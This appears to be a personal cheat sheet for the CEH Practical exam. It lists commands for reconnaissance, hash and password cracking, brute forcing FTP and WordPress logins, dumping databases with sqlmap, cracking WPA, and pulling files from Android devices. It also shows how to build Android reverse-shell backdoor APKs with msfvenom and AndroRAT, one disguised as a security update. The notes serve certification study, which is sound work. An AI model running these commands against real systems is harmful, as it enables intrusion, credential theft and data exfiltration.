# **CEH Practical Notes**

Geolocation BillCipher

```
nmap --script vuln xx.xx.xx.xx

https://nvd.nist.gov
```

```
ldapsearch -h 10.10.10.25 -x -s base namingcontexts
ldapsearch -h 10.10.10.25 -x -b "cn=users,dc=CEHORG,dc=COM" "(objectclass=user)" | grep dn 
ldapsearch -x -b "dc=cehorg,dc=com" "*" -h 10.10.10.25 | awk '/dn: / {print $2}' 
```

dig AXFR yourdomain.com @ns


FQDN/Netbios name	nmap -p 445 --script smb-os-discovery 10.10.10.25 or nmap -T4 -p 445 -sC 10.10.10.25

DNS Computer Name	3389

SMB Message signing	nmap -T4 -p 445 -sC 10.10.10.25

whatweb www.certifiedhacker.com

```
john --format=NT hashes.txt
john --show --format=NT

https://hashes.com/en/decrypt/hash
https://crackstation.net/
```

```
cd Desktop/CEHtab13
cd Wordlist
hydra -L Usernames.txt -P Passwords.txt ftp://172.16.0.12
```

**Wireshark filters** 
```
http.request.method==POST
tcp.flags.syn == 1 and tcp.flags.ack == 0  Statistics=>Ipv4 Statistics=>Source and Destination Addresses
tcp.flags.syn == 1 DoS 
tcp.srcport == 8888 and tcp.dstport == 9999
```
```
snow.exe -C -p password Confidential.txt
```

```
apt install nfs-common
showmount -e 172.16.0.11
mkdir -p /mnt/linux
mount -t nfs 172.16.0.11:/home /mnt/linux
ls -l /mnt/linux
```

PhoneSploit
4 - shell

9 - copy file /storage/self/primary/DCIM/capture.png or /sdcard/Download/confidential.txt

```
adb connect 172.16.0.21 5555
adb shell
adb pull /sdcard/Documents/confidential.txt
```
```
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk 

msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 10.10.1.13
exploit -j -z 

```
```
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk 
python3 androRAT.py --shell -i 0.0.0.0 -p 4444 
```
```
https://www.sisik.eu/apk-tool
```
yersinia F2 x 1 q ==>Wireshark Transaction ID 0x643c9869

```
sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" --dbs
sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope --tables
sqlmap --batch -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value" -D moviescope -T User_Login --dump
```

wpscan -U adam -P password.txt --url http://cehorg.com
```
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE password.txt
set RHOST 10.10.10.16
set RPORT 80
set TARGETURI http://cehorg.com
set USERNAME adam
set ENUMERATE_USERNAMES false
set verbose false
run
```
```
aircrack-ng WEP.pcap
aircrack-ng -a2 -w passwords.txt WPA2.pcap
```
```
https://www.shodan.io 
port:1883 ==> MQTT
ICS/SCADA systems port:502
```
